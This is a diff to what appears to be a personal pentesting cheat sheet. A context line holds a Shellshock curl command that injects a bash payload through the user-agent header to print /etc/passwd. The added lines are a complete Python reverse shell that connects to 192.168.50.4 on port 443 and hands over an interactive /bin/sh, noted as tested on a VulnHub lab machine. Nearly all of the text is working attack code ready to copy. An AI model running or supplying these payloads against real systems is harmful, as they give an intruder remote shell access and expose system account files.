@@ -380,3 +380,15 @@ python -c 'import urllib;urllib.urlretrieve ("http://www.example.com/songs/mp3.m
 
 Check for shell shock vulnerability:
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<ip>/cgi-bin/underworld(vulnerable script)
+
+Python reverse shell pentest monkey one with new line(tested on vulnhub machine symfonos3):
+
+import socket,subprocess,os
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.50.4",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p = subprocess.call(["/bin/sh","-i"])
+
